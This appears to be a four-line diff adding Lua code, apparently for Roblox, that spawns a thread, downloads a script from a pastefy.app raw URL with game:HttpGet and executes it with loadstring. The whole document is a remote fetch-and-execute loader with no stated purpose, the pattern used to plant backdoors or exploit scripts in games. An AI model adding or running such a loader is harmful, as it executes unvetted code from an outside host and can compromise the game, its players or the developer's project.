@@ -1,0 +1,4 @@
+spawn(function() 
+     loadstring(game:HttpGet("https://pastefy.app/o3CKTsQj/raw"))()
+end)
+
